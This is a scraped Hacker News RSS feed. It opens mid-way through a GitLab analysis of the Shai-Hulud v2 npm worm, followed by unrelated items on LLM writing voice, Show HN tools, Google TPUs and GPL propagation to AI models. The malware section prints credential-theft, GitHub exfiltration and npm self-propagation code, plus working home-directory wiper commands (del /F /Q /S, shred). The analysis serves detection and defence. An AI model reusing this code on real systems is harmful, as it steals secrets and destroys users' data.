The  loader downloads or locates the Bun runtime on the system, then executes the bundled  payload, a 10MB obfuscated file already present in the infected package. This approach provides multiple layers of evasion: the initial loader is small and seemingly legitimate, while the actual malicious code is heavily obfuscated and bundled into a file too large for casual inspection.Once executed, the malware immediately begins credential discovery across multiple sources:: Searches environment variables and GitHub CLI configurations for tokens starting with  (GitHub personal access token) or (GitHub OAuth token): Enumerates AWS, GCP, and Azure credentials using official SDKs, checking environment variables, config files, and metadata services: Extracts tokens for package publishing from  files and environment variables, which are common locations for securely storing sensitive configuration and credentials.: Downloads and executes Trufflehog, a legitimate security tool, to scan the entire home directory for API keys, passwords, and other secrets hidden in configuration files, source code, or git historyasync function scanFilesystem() {
  let scanner = new Trufflehog();
  await scanner.initialize();
  
  // Scan user's home directory for secrets
  let findings = await scanner.scanFilesystem(os.homedir());
  
  // Upload findings to exfiltration repo
  await github.saveContents("truffleSecrets.json", 
    JSON.stringify(findings));
}
Data exfiltration network The malware uses stolen GitHub tokens to create public repositories with a specific marker in their description: "Sha1-Hulud: The Second Coming." These repositories serve as dropboxes for stolen credentials and system information.async function createRepo(name) {
  // Creates a repository with a specific description marker
  let repo = await this.octokit.repos.createForAuthenticatedUser({
    name: name,
    description: "Sha1-Hulud: The Second Coming.", // Marker for finding repos later
    private: false,
    auto_init: false,
    has_discussions: true
  });
  
  // Install GitHub Actions runner for persistence
  if (await this.checkWorkflowScope()) {
    let token = await this.octokit.request(
      "POST /repos/{owner}/{repo}/actions/runners/registration-token"
    );
    await installRunner(token); // Installs self-hosted runner
  }
  
  return repo;
}
Critically, if the initial GitHub token lacks sufficient permissions, the malware searches for other compromised repositories with the same marker, allowing it to retrieve tokens from other infected systems. This creates a resilient botnet-like network where compromised systems share access tokens.// How the malware network shares tokens:
async fetchToken() {
  // Search GitHub for repos with the identifying marker
  let results = await this.octokit.search.repos({
    q: '"Sha1-Hulud: The Second Coming."',
    sort: "updated"
  });
  
  // Try to retrieve tokens from compromised repos
  for (let repo of results) {
    let contents = await fetch(
      `https://raw.githubusercontent.com/${repo.owner}/${repo.name}/main/contents.json`
    );
    
    let data = JSON.parse(Buffer.from(contents, 'base64').toString());
    let token = data?.modules?.github?.token;
    
    if (token && await validateToken(token)) {
      return token;  // Use token from another infected system
    }
  }
  return null;  // No valid tokens found in network
}
Using stolen npm tokens, the malware:Downloads all packages maintained by the victimInjects the  loader into each package's preinstall scriptsBundles the malicious  payloadIncrements the package version numberRepublishes the infected packages to npmasync function updatePackage(packageInfo) {
  // Download original package
  let tarball = await fetch(packageInfo.tarballUrl);
  
  // Extract and modify package.json
  let packageJson = JSON.parse(await readFile("package.json"));
  
  // Add malicious preinstall script
  packageJson.scripts.preinstall = "node setup_bun.js";
  
  // Increment version
  let version = packageJson.version.split(".").map(Number);
  version[2] = (version[2] || 0) + 1;
  packageJson.version = version.join(".");
  
  // Bundle backdoor installer
  await writeFile("setup_bun.js", BACKDOOR_CODE);
  
  // Repackage and publish
  await Bun.$`npm publish ${modifiedPackage}`.env({
    NPM_CONFIG_TOKEN: this.token
  });
}
Our analysis uncovered a destructive payload designed to protect the malware’s infrastructure against takedown attempts.The malware continuously monitors its access to GitHub (for exfiltration) and npm (for propagation). If an infected system loses access to both channels simultaneously, it triggers immediate data destruction on the compromised machine. On Windows, it attempts to delete all user files and overwrite disk sectors. On Unix systems, it uses  to overwrite files before deletion, making recovery nearly impossible.// CRITICAL: Token validation failure triggers destruction
async function aL0() {
  let githubApi = new dq();
  let npmToken = process.env.NPM_TOKEN || await findNpmToken();
  
  // Try to find or create GitHub access
  if (!githubApi.isAuthenticated() || !githubApi.repoExists()) {
    let fetchedToken = await githubApi.fetchToken(); // Search for tokens in compromised repos
    
    if (!fetchedToken) {  // No GitHub access possible
      if (npmToken) {
        // Fallback to NPM propagation only
        await El(npmToken);
      } else {
        // DESTRUCTION TRIGGER: No GitHub AND no NPM access
        console.log("Error 12");
        if (platform === "windows") {
          // Attempts to delete all user files and overwrite disk sectors
          Bun.spawnSync(["cmd.exe", "/c", 
            "del /F /Q /S \"%USERPROFILE%*\" && " +
            "for /d %%i in (\"%USERPROFILE%*\") do rd /S /Q \"%%i\" & " +
            "cipher /W:%USERPROFILE%"  // Overwrite deleted data
          ]);
        } else {
          // Attempts to shred all writable files in home directory
          Bun.spawnSync(["bash", "-c", 
            "find \"$HOME\" -type f -writable -user \"$(id -un)\" -print0 | " +
            "xargs -0 -r shred -uvz -n 1 && " +  // Overwrite and delete
            "find \"$HOME\" -depth -type d -empty -delete"  // Remove empty dirs
          ]);
        }
        process.exit(0);
      }
    }
  }
}
This creates a dangerous scenario. If GitHub mass-deletes the malware's repositories or npm bulk-revokes compromised tokens, thousands of infected systems could simultaneously destroy user data. The distributed nature of the attack means that each infected machine independently monitors access and will trigger deletion of the user’s data when a takedown is detected.To aid in detection and response, here is a more comprehensive list of the key indicators of compromise (IoCs) identified during our analysis.Malicious post-install script in node_modules directoriesHidden directory created in user home for Trufflehog binary storageTemporary directory used for binary extraction.truffler-cache/trufflehogDownloaded Trufflehog binary (Linux/Mac).truffler-cache/trufflehog.exeDownloaded Trufflehog binary (Windows)del /F /Q /S "%USERPROFILE%*"Windows destructive payload commandLinux/Mac destructive payload commandWindows secure deletion command in payloadcurl -fsSL https://bun.sh/install | bashSuspicious Bun installation during NPM package installpowershell -c "irm bun.sh/install.ps1|iex"Windows Bun installation via PowerShellHow GitLab can help you detect this malware campaign If you are using GitLab Ultimate, you can leverage built-in security capabilities to immediately surface exposure tied to this attack within your projects.First, enable  to automatically analyze your project's dependencies against known vulnerability databases. If infected packages are present in your  or  files, Dependency Scanning will flag them in your pipeline results and the Vulnerability Report. For complete setup instructions, refer to the Dependency Scanning documentation.Once enabled, merge requests introducing a compromised package will surface a warning before the code reaches your main branch.Next,  can be used with Dependency Scanning to provide a fast way to check your project's exposure without navigating through reports. From the dropdown, select the Security Analyst Agent and simply ask questions like:"Are any of my dependencies affected by the Shai-Hulud v2 malware campaign?""Does this project have any npm supply chain vulnerabilities?""Does this project have any npm supply chain vulnerabilities?""Show me critical vulnerabilities in my JavaScript dependencies."The agent will query your project's vulnerability data and provide a direct answer, helping security teams triage quickly across multiple projects.For teams managing many repositories, we recommend combining these approaches: use Dependency Scanning for continuous automated detection in CI/CD, and the Security Analyst Agent for ad-hoc investigation and rapid response during active incidents like this one.This campaign represents an evolution in supply chain attacks where the threat of collateral damage becomes the primary defense mechanism for the attacker's infrastructure. The investigation is ongoing as we work with the community to understand the full scope and develop safe remediation strategies.GitLab's automated detection systems continue to monitor for new infections and variations of this attack. By sharing our findings early, we hope to help the community respond effectively while avoiding the pitfalls created by the malware's dead man's switch design.]]></content:encoded></item><item><title>We&apos;re losing our voice to LLMs</title><link>https://tonyalicea.dev/blog/were-losing-our-voice-to-llms/</link><author>TonyAlicea10</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 14:51:01 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[Social media has become a reminder of something precious we are losing in the age of LLMs: .Over time, it has become obvious just how many posts are being generated by an LLM. The tell is the voice. Every post sounds like it was posted by the same social media manager.If you rely on an LLM to write all your posts, you are making a mistake.Your voice is an asset. Not just what you want to say, but how you say it.Your voice is unique. It is formed from your lifetime of lived experiences. No one's voice will be exactly like yours.Your voice becomes recognizable. Over many posts it becomes something people subconsciously connect with, recognize, trust, and look forward to.Your voice provides the framework for the impression you leave in a job interview, while networking at a meet-up, or with a co-worker.Years ago I got a job thanks to my blog posts. A manager wanted my voice influencing their organization. Your voice is an asset.Your voice matures and becomes even more unique with time and practice.LLMs can rob you of that voice, and the rest of us lose something precious in the process.Having an LLM write "in your voice" is not the same. Your voice is not static. It changes with the tides of your life and state of mind. Your most impactful message may come because it was the right moment and you were in the right frame of mind.Let your voice grow with use. Let it be unique.Do not let one of your greatest assets fade into atrophy, wilted by cognitive laziness.I do not care what the linguistic remix machine juggles into being.I care what you have to say.]]></content:encoded></item><item><title>Show HN: SyncKit – Offline-first sync engine (Rust/WASM and TypeScript)</title><link>https://github.com/Dancode-188/synckit</link><author>danbitengo</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 14:31:44 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Show HN: Runprompt – run .prompt files from the command line</title><link>https://github.com/chr15m/runprompt</link><author>chr15m</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 14:26:35 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[I built a single-file Python script that lets you run LLM prompts from the command line with templating, structured outputs, and the ability to chain prompts together.When I discovered Google's Dotprompt format (frontmatter + Handlebars templates), I realized it was perfect for something I'd been wanting: treating prompts as first-class programs you can pipe together Unix-style. Google uses Dotprompt in Firebase Genkit and I wanted something simpler - just run a .prompt file directly on the command line.Here's what it looks like:---
model: anthropic/claude-sonnet-4-20250514
output:
  format: json
  schema:
    sentiment: string, positive/negative/neutral
    confidence: number, 0-1 score
---
Analyze the sentiment of: {{STDIN}}cat reviews.txt | ./runprompt sentiment.prompt | jq '.sentiment'The things I think are interesting:* Structured output schemas: Define JSON schemas in the frontmatter using a simple `field: type, description` syntax. The LLM reliably returns valid JSON you can pipe to other tools.* Prompt chaining: Pipe JSON output from one prompt as template variables into the next. This makes it easy to build multi-step agentic workflows as simple shell pipelines.* Zero dependencies: It's a single Python file that uses only stdlib. Just curl it down and run it.* Provider agnostic: Works with Anthropic, OpenAI, Google AI, and OpenRouter (which gives you access to dozens of models through one API key).You can use it to automate things like extracting structured data from unstructured text, generating reports from logs, and building small agentic workflows without spinning up a whole framework.Would love your feedback, and PRs are most welcome!]]></content:encoded></item><item><title>TPUs vs. GPUs and why Google is positioned to win AI race in the long term</title><link>https://www.uncoveralpha.com/p/the-chip-made-for-the-ai-inference</link><author>vegasbrianc</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 13:28:34 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[As I find the topic of Google TPUs extremely important, I am publishing a comprehensive deep dive, not just a technical overview, but also strategic and financial coverage of the Google TPU.The history of the TPU and why it all even started?The difference between a TPU and a GPU?Performance numbers TPU vs GPU?Where are the problems for the wider adoption of TPUsGoogle’s TPU is the biggest competitive advantage of its cloud business for the next 10 yearsHow many TPUs does Google produce today, and how big can that get?Gemini 3 and the aftermath of Gemini 3 on the whole chip industryThe history of the TPU and why it all even started?The story of the Google Tensor Processing Unit (TPU) begins not with a breakthrough in chip manufacturing, but with a realization about math and logistics. Around 2013, Google’s leadership—specifically Jeff Dean, Jonathan Ross (the CEO of Groq), and the Google Brain team—ran a projection that alarmed them. They calculated that if every Android user utilized Google’s new voice search feature for just three minutes a day, the company would need to double its global data center capacity just to handle the compute load.At the time, Google was relying on standard CPUs and GPUs for these tasks. While powerful, these general-purpose chips were inefficient for the specific heavy lifting required by Deep Learning: massive matrix multiplications. Scaling up with existing hardware would have been a financial and logistical nightmare.ASIC (Application-Specific Integrated Circuit)Key Historical Milestones:This urgency to solve the “data center doubling” problem is why the TPU exists. It wasn’t built to sell to gamers or render video; it was built to save Google from its own AI success. With that in mind, Google has been thinking about the »costly« AI inference problems for over a decade now. This is also one of the main reasons why the TPU is so good today compared to other ASIC projects.The difference between a TPU and a GPU?To understand the difference, it helps to look at what each chip was originally built to do. A GPU is a “general-purpose” parallel processor, while a TPU is a “domain-specific” architecture.The GPUs were designed for graphics. They excel at parallel processing (doing many things at once), which is great for AI. However, because they are designed to handle everything from video game textures to scientific simulations, they carry “architectural baggage.” They spend significant energy and chip area on complex tasks like caching, branch prediction, and managing independent threads.A TPU, on the other hand, strips away all that baggage. It has no hardware for rasterization or texture mapping. Instead, it uses a unique architecture called a Systolic Array.The “Systolic Array” is the key differentiator. In a standard CPU or GPU, the chip moves data back and forth between the memory and the computing units for every calculation. This constant shuffling creates a bottleneck (the Von Neumann bottleneck).In a TPU’s systolic array, data flows through the chip like blood through a heart (hence “systolic”).It loads data (weights) once.It passes inputs through a massive grid of multipliers.The data is passed directly to the next unit in the array without writing back to memory.What this means, in essence, is that a TPU, because of its systolic array, drastically reduces the number of memory reads and writes required from HBM. As a result, the TPU can spend its cycles computing rather than waiting for data.Google’s new TPU design, also called Ironwood also addressed some of the key areas where a TPU was lacking:They enhanced the SparseCore for efficiently handling large embeddings (good for recommendation systems and LLMs)It increased HBM capacity and bandwidth (up to 192 GB per chip). For a better understanding, Nvidia’s Blackwell B200 has 192GB per chip, while Blackwell Ultra, also known as the B300, has 288 GB per chip.Improved the Inter-Chip Interconnect (ICI) for linking thousands of chips into massive clusters, also called TPU Pods (needed for AI training as well as some time test compute inference workloads). When it comes to ICI, it is important to note that it is very performant with a Peak Bandwidth of 1.2 TB/s vs Blackwell NVLink 5 at 1.8 TB/s. But Google’s ICI, together with its specialized compiler and software stack, still delivers superior performance on some specific AI tasks.The key thing to understand is that because the TPU doesn’t need to decode complex instructions or constantly access memory, it can deliver significantly higher Operations Per Joule.For scale-out, Google uses Optical Circuit Switch (OCS) and its 3D torus network, which compete with Nvidia’s InfiniBand and Spectrum-X Ethernet. The main difference is that OCS is extremely cost-effective and power-efficient as it eliminates electrical switches and O-E-O conversions, but because of this, it is not as flexible as the other two. So again, the Google stack is extremely specialized for the task at hand and doesn’t offer the flexibility that GPUs do.Performance numbers TPU vs GPU?As we defined the differences, let’s look at real numbers showing how the TPU performs compared to the GPU. Since Google isn’t revealing these numbers, it is really hard to get details on performance. I studied many articles and alternative data sources, including interviews with industry insiders, and here are some of the key takeaways.The first important thing is that there is very limited information on Google’s newest TPUv7 (Ironwood), as Google introduced it in April 2025 and is just now starting to become available to external clients (internally, it is said that Google has already been using Ironwood since April, possibly even for Gemini 3.0.). And why is this important if we, for example, compare TPUv7 with an older but still widely used version of TPUv5p based on Semianalysis data:TPUv7 produces 4,614 TFLOPS(BF16) vs 459 TFLOPS for TPUv5pTPUv7 has 192GB of memory capacity vs TPUv5p 96GBTPUv7 memory Bandwidth is 7,370 GB/s vs 2,765 for v5pWe can see that the performance leaps between v5 and v7 are very significant. To put that in context, most of the comments that we will look at are more focused on TPUv6 or TPUv5 than v7.Based on analyzing a ton of interviews with Former Google employees, customers, and competitors (people from AMD, NVDA & others), the summary of the results is as follows.Most agree that TPUs are more cost-effective compared to Nvidia GPUs, and most agree that the performance per watt for TPUs is better. This view is not applicable across all use cases tho.A Former Google Cloud employee:»If it is the right application, then they can deliver much better performance per dollar compared to GPUs. They also require much lesser energy and produces less heat compared to GPUs. They’re also more energy efficient and have a smaller environmental footprint, which is what makes them a desired outcome.The use cases are slightly limited to a GPU, they’re not as generic, but for a specific application, they can offer as much as 1.4X better performance per dollar, which is pretty significant saving for a customer that might be trying to use GPU versus TPUs.«Similarly, a very insightful comment from a Former Unit Head at Google around TPUs materially lowering AI-search cost per query vs GPUs:»TPU v6 is 60-65% more efficient than GPUs, prior generations 40-45%«This interview was in November 2024, so the expert is probably comparing the v6 TPU with the Nvidia Hopper. Today, we already have Blackwell vs V7.Many experts also mention the speed benefit that TPUs offer, with a Former Google Head saying that TPUs are 5x faster than GPUs for training dynamic models (like search-like workloads).There was also a very eye-opening interview with a client who used both Nvidia GPUs and Google TPUs as he describes the economics in great detail:»If I were to use eight H100s versus using one v5e pod, I would spend a lot less money on one v5e pod. In terms of price point money, performance per dollar, you will get more bang for TPU. If I already have a code, because of Google’s help or because of our own work, if I know it already is going to work on a TPU, then at that point it is beneficial for me to just stick with the TPU usage.Google has got a good promise so they keep supporting older TPUs and they’re making it a lot cheaper. If you don’t really need your model trained right away, if you’re willing to say, “I can wait one week,” even though the training is only three days, then you can reduce your cost 1/5.«Another valuable interview was with a current AMD employee, acknowledging the benefits of ASICs:»I would expect that an AI accelerator could do about probably typically what we see in the industry. I’m using my experience at FPGAs. I could see a 30% reduction in size and maybe a 50% reduction in power vs a GPU.«We also got some numbers from a Former Google employee who worked in the chip segment:»When I look at the published numbers, they (TPUs) are anywhere from 25%-30% better to close to 2x better, depending on the use cases compared to Nvidia. Essentially, there’s a difference between a very custom design built to do one task perfectly versus a more general purpose design.«What is also known is that the real edge of TPUs lies not in the hardware but in the software and in the way Google has optimized its ecosystem for the TPU.A lot of people mention the problem that every Nvidia »competitor« like the TPU faces, which is the fast development of Nvidia and the constant »catching up« to Nvidia problem. This month a former Google Cloud employee addressed that concern head-on as he believes the rate at which TPUs are improving is faster than the rate at Nvidia:»The amount of performance per dollar that a TPU can generate from a new generation versus the old generation is a much significant jump than Nvidia«In addition, the recent data from Google’s presentation at the Hot Chips 2025 event backs that up, as Google stated that the TPUv7 is 100% better in performance per watt than their TPUv6e (Trillium).Even for hard Nvidia advocates, TPUs are not to be shrugged off easily, as even Jensen thinks very highly of Google’s TPUs. In a podcast with Brad Gerstner, he mentioned that when it comes to ASICs, Google with TPUs is a »special case«. A few months ago, we also got an article from the WSJ saying that after the news publication The Information published a report that stated that OpenAI had begun renting Google TPUs for ChatGPT, Jensen called Altman, asking him if it was true, and signaled that he was open to getting the talks back on track (investment talks). Also worth noting was that Nvidia’s official X account posted a screenshot of an article in which OpenAI denied plans to use Google’s in-house chips. To say the least, Nvidia is watching TPUs very closely.Ok, but after looking at some of these numbers, one might think, why aren’t more clients using TPUs?Where are the problems for the wider adoption of TPUsIt is also important to note that, until recently, the GenAI industry’s focus has largely been on training workloads. In training workloads, CUDA is very important, but when it comes to inference, even reasoning inference, CUDA is not that important, so the chances of expanding the TPU footprint in inference are much higher than those in training (although TPUs do really well in training as well – Gemini 3 the prime example).The fact that most clients are multi-cloud also poses a challenge for TPU adoption, as AI workloads are closely tied to data and its location (cloud data transfer is costly). Nvidia is accessible via all three hyperscalers, while TPUs are available only at GCP so far. A client who uses TPUs and Nvidia GPUs explains it well:»Right now, the one biggest advantage of NVIDIA, and this has been true for past three companies I worked on is because AWS, Google Cloud and Microsoft Azure, these are the three major cloud companies.Every company, every corporate, every customer we have will have data in one of these three. All these three clouds have NVIDIA GPUs. Sometimes the data is so big and in a different cloud that it is a lot cheaper to run our workload in whatever cloud the customer has data in.I don’t know if you know about the egress cost that is moving data out of one cloud is one of the bigger cost. In that case, if you have NVIDIA workload, if you have a CUDA workload, we can just go to Microsoft Azure, get a VM that has NVIDIA GPU, same GPU in fact, no code change is required and just run it there.With TPUs, once you are all relied on TPU and Google says, “You know what? Now you have to pay 10X more,” then we would be screwed, because then we’ll have to go back and rewrite everything. That’s why. That’s the only reason people are afraid of committing too much on TPUs. The same reason is for Amazon’s Trainium and Inferentia.«These problems are well known at Google, so it is no surprise that internally, the debate over keeping TPUs inside Google or starting to sell them externally is a constant topic. When keeping them internally, it enhances the GCP moat, but at the same time, many former Google employees believe that at some point, Google will start offering TPUs externally as well, maybe through some neoclouds, not necessarily with the biggest two competitors, Microsoft and Amazon. Opening up the ecosystem, providing support, etc., and making it more widely usable are the first steps toward making that possible.A former Google employee also mentioned that Google last year formed a more sales-oriented team to push and sell TPUs, so it’s not like they have been pushing hard to sell TPUs for years; it is a fairly new dynamic in the organization.Google’s TPU is the biggest competitive advantage of its cloud business for the next 10 yearsThe most valuable thing for me about TPUs is their impact on GCP. As we witness the transformation of cloud businesses from the pre-AI era to the AI era, the biggest takeaway is that the industry has gone from an oligopoly of AWS, Azure, and GCP to a more commoditized landscape, with Oracle, Coreweave, and many other neoclouds competing for AI workloads. The problem with AI workloads is the competition and Nvidia’s 75% gross margin, which also results in low margins for AI workloads. The cloud industry is moving from a 50-70% gross margin industry to a 20-35% gross margin industry. For cloud investors, this should be concerning, as the future profile of some of these companies is more like that of a utility than an attractive, high-margin business. But there is a solution to avoiding that future and returning to a normal margin: the ASIC.The cloud providers who can control the hardware and are not beholden to Nvidia and its 75% gross margin will be able to return to the world of 50% gross margins. And there is no surprise that all three AWS, Azure, and GCP are developing their own ASICs. The most mature by far is Google’s TPU, followed by Amazon’s Trainum, and lastly Microsoft’s MAIA (although Microsoft owns the full IP of OpenAI’s custom ASICs, which could help them in the future).While even with ASICs you are not 100% independent, as you still have to work with someone like Broadcom or Marvell, whose margins are lower than Nvidia’s but still not negligible, Google is again in a very good position. Over the years of developing TPUs, Google has managed to control much of the chip design process in-house. According to a current AMD employee, Broadcom no longer knows everything about the chip. At this point, Google is the front-end designer (the actual RTL of the design) while Broadcom is only the backend physical design partner. Google, on top of that, also, of course, owns the entire software optimization stack for the chip, which makes it as performant as it is. According to the AMD employee, based on this work split, he thinks Broadcom is lucky if it gets a 50-point gross margin on its part.Without having to pay Nvidia for the accelerator, a cloud provider can either price its compute similarly to others and maintain a better margin profile or lower costs and gain market share. Of course, all of this depends on having a very capable ASIC that can compete with Nvidia. Unfortunately, it looks like Google is the only one that has achieved that, as the number one-performing model is Gemini 3 trained on TPUs. According to some former Google employees, internally, Google is also using TPUs for inference across its entire AI stack, including Gemini and models like Veo. Google buys Nvidia GPUs for GCP, as clients want them because they are familiar with them and the ecosystem, but internally, Google is full-on with TPUs.As the complexity of each generation of ASICs increases, similar to the complexity and pace of Nvidia, I predict that not all ASIC programs will make it. I believe outside of TPUs, the only real hyperscaler shot right now is AWS Trainium, but even that faces much bigger uncertainties than the TPU. With that in mind, Google and its cloud business can come out of this AI era as a major beneficiary and market-share gainer.Recently, we even got comments from the SemiAnalysis team praising the TPU:How many TPUs does Google produce today, and how big can that get?Here are the numbers that I researched:]]></content:encoded></item><item><title>Show HN: MkSlides – Markdown to slides with a similar workflow to MkDocs</title><link>https://github.com/MartenBE/mkslides</link><author>MartenBE</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 13:00:17 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[As a teacher, we keep our slides as markdown files in git repos and want to build these automatically so they can be viewed online (or offline if needed). To achieve this, I have created MkSlides. This tool converts all markdown in a folder to slides generated with Reveal.js.
The workflow is very similar to MkDocs.Install: `pip install mkslides`Building slides: `mkslides build`Live preview during editing: `mkslides serve`Comparison with other tools like marp, slidev, ...:- This tool is a single command and easy to integrate in CI/CD pipelines.- The workflow is also very similar to MkDocs, which makes it easy to combine the two in a single GitHub/GitLab repo.- Generates an index landing page for multiple slideshows in a folder which is really convenient if you have e.g. a slideshow per chapter.]]></content:encoded></item><item><title>The current state of the theory that GPL propagates to AI models</title><link>https://shujisado.org/2025/11/27/gpl-propagates-to-ai-models-trained-on-gpl-code/</link><author>jonymo</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 12:48:12 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[When GitHub Copilot was launched in 2021, the fact that its training data included a vast amount of Open Source code publicly available on GitHub attracted significant attention, sparking lively debates regarding licensing. While there were issues concerning conditions such as attribution required by most licenses, there was a particularly high volume of discourse suggesting that the conditions of copyleft licenses, such as the GNU General Public License (GNU GPL), would propagate to the model itself, necessitating that the entire model be released under the same license. The propagation of the GPL is a concept that many modern software engineers have naturally accepted; thus, for an engineer with a straightforward sensibility, it is a perfectly natural progression to think that if GPL code is included in some form, copyleft applies and the license propagates.However, as of 2025, the theory that the license of the source code propagates to AI models trained on Open Source code is not seen as frequently as it was back then. Although some ardent believers in software freedom still advocate for such theories, it appears they are being overwhelmed by the benefits of AI coding, which has overwhelmingly permeated the programming field. Amidst this trend, even I sometimes succumb to the illusion that such a theory never existed in the first place.Has the theory that the license of training code propagates to such AI models been completely refuted?Actually, it has not. This issue remains an indeterminate problem where lawsuits are still ongoing and the judgments of major national governments have not been made clear. In this article, I will explain the current situation of this license propagation theory, namely “GPL propagates to AI models trained on GPL code,” and connect it to points of discussion such as the legal positioning of models and the nature of the freedom we pursue in the AI domain.This article is an English translation of a post originally written in Japanese. While it assumes a Japanese reader, I believe it may also be useful for an English-speaking audience.The Current Standing in Two LawsuitsFirst, let us organize what the “GPL propagation theory to AI models” entails. This is the idea that when an AI model ingests GPL code as training data, the model itself constitutes a derivative work (derivative) of the GPL code; therefore, when distributing the model, the copyleft conditions of the GPL, such as the obligation to disclose source code, apply. In other words, it is not a question of whether the output of the model is similar to the GPL code, but a theory that “since the model itself is a derivative containing GPL code, the GPL extends to the model.” While there were many voices supporting this theory around 2021, as mentioned earlier, it is no longer the mainstream of the discussion today. However, two major ongoing lawsuits can be cited as grounds that this theory has not been completely denied. These are  (the Copilot class action) filed in the United States and  filed in Germany. I will explain the history and current status of each lawsuit below.Doe v. GitHub (Copilot Class Action): The Persisting Claim of Open Source License ViolationIn the Copilot class action filed at the end of 2022 in relation to GitHub Copilot, anonymous developers became plaintiffs and argued that GitHub, Microsoft, and OpenAI trained their models on source code from public repositories without permission, inviting massive license violations through Copilot. Specifically, they viewed it as problematic that when Copilot reproduces part of the code that served as the training source in its output, it does not perform the author attribution or copyright notice required by licenses such as MIT or Apache-2.0 at all, and furthermore, it indiscriminately trains on and outputs code under licenses that impose copyleft conditions like the GPL, thereby trampling on license clauses. The plaintiffs claimed this was a contractual violation of open source licenses and also sought damages and injunctions, asserting that it constituted a violation of the Digital Millennium Copyright Act (DMCA) under copyright law.In this case, several decisions have already been handed down by the United States District Court for the Northern District of California, and many of the plaintiffs’ claims have been dismissed. What were dismissed were mainly peripheral claims such as DMCA clause violations, privacy policy violations, unjust enrichment, and torts, but some DMCA violations and the claim of “violation of open source licenses” (breach of contract) are still alive. Regarding the latter specifically, the argument is that despite the plaintiffs’ code being published under licenses like GPL or MIT, the defendants failed to comply with the author attribution or the obligation to publish derivatives under the same license, which constitutes a contractual violation. Although the court did not recognize claims for monetary damages because the plaintiffs could not demonstrate a specific amount of damage, it determined that there were sufficient grounds for the claim for injunctive relief against the license violation itself. As a result, the plaintiffs are permitted to continue the lawsuit seeking an order prohibiting the act of Copilot reproducing others’ code without appropriate license indications.As is clear from the above history, “violation of open source licenses in training data” is still being contested in court in the Copilot litigation, and this is one of the reasons why the theory of license propagation to models has not been completely denied. The plaintiffs’ claim in this lawsuit does not directly demand the release of the model itself under the GPL, but it legally pursues the point that license conditions were ignored in the process of training and output; consequently, it suggests that “if the handling does not follow the license of the training data, the act of providing the model could be illegal.” Furthermore, the court has not clearly rejected this logic at this stage and has indicated a judgment that the use of open source code is accompanied by license obligations, and providing tools that ignore this could constitute a tort subject to injunction.However, it is necessary to note that the claims in the Copilot litigation are legally framed as breach of contract (license) or DMCA violation, and are not a direct copyright argument that “the model is a derivative work of GPL code.” No judgment has been shown stepping so far as to mandate the disclosure of the entire model under the GPL license. The actual judgment is conservative, stating “monetary damages have not been shown, but there is room for future injunctive relief,” and does not mention the obligation to disclose the model itself. In other words, at present, there is no judicial precedent directly addressing the “GPL propagation theory to models,” and the situation is one where the issue raised regarding license violation of the source code remains alive in the judicial arena.GEMA v. OpenAI: The Theory Treating “Memory” in Models as Legal ReproductionAnother important lawsuit is the case where the German music copyright collective GEMA sued OpenAI. This is a copyright lawsuit concerning the unauthorized training and output of lyrics by an AI model, not AI code generation, but it carries significant theoretical implications related to “license propagation to models” even if not directly related to GPL.In November 2025, the Munich I Regional Court handed down a judgment on this lawsuit, indicating regarding the matter where the ChatGPT model had memorized and reproduced the lyrics of 9 famous German songs, that the act of “memory” inside the model itself falls under the act of reproduction under copyright law. According to the judgment, the lyrics under the plaintiff’s management were “fixed” in the models of ChatGPT’s GPT-4 and 4o, and the situation was such that the lyrics were output almost verbatim just by the user giving a simple prompt. Based on this, the court determined that the model contains “parameters that memorized the work” internally, and if it is possible to reproduce an expression substantially identical to the original work for a human by means of an appropriate prompt, that memory itself falls under “reproduction” in Article 16 of the German Copyright Act. Furthermore, it determined that the act of actually outputting lyrics in response to a prompt is also a separate act of reproduction, and providing lyrics to the user falls under the act of making available to the public (public transmission). Also, it ruled that since all of these are done without the permission of the rights holder, they deviate from the scope justified by the TDM (Text and Data Mining) exception in the EU DSM Copyright Directive.The important point of this judgment is that it clearly acknowledged that “if a work is recorded inside the model in a reproducible form, that state itself can constitute copyright infringement.” The court cited the text of the EU InfoSoc Directive that “reproduction includes copies in any form or manner, and does not need to be directly perceptible to humans,” and stated that in the spirit of this, even if the lyrics are encoded within the model’s parameters, it amounts to the creation of a reproduction. It went as far as to mention that “encoding in the form of probabilistic weights does not prevent it from being considered a copy,” showing a strong recognition that differences in technical formats cannot avoid the nature of reproduction under copyright law. Also, since the fact that the model could output the lyrics was not coincidental but highly consistent, it was factually found that “the direct incorporation of the essential part of the training data” occurred rather than the result of statistical learning. As a result, the Munich District Court recognized OpenAI’s liability for injunction and damages regarding the output act of the lyrics in question, and further ordered the provision of information regarding training data and output content for the future. However, this judgment is the first instance, and since OpenAI has indicated an intention to appeal, it is expected to be a continuing dispute.The noteworthy theory shown by this GEMA judgment is the extension of the concept of reproduction under copyright law to the interior of the model. That is, if the work used as training data remains within the model and can be reproduced with a simple operation, it means the model already contains a reproduction of that work. This theory is groundbreaking in that it deems “the model contains the source work,” and indeed, in a commentary by Osborne Clarke, it is evaluated that “in contrast to the judgment of the English High Court in the  case, the Munich District Court explicitly recognized the possibility that the AI model contains copies of the training material.” Standing on this view, the model is not merely a result of analysis, but depending on the case, can be evaluated as an aggregate of the training data itself.However, it is necessary to keep in mind that this judgment is based on an extreme case where a complete match output was obtained with short text such as lyrics. The court itself stated, “Normally, temporary reproduction for learning remains within the purpose of analysis and does not infringe on the rights holder’s market, but in this case, the model holds the work in a restorable form and exceeds the scope of analysis,” emphasizing that the judgment is limited to “cases where the model performs complete reproduction.” Also, as the UK case shows, judicial decisions vary by country, and a legal consensus on this issue has not yet been formed.Nevertheless, the judgment this time, which declared that the recording of a work inside a model is a reproduction, can become a major basis supporting the license propagation theory. This is because, while the premise 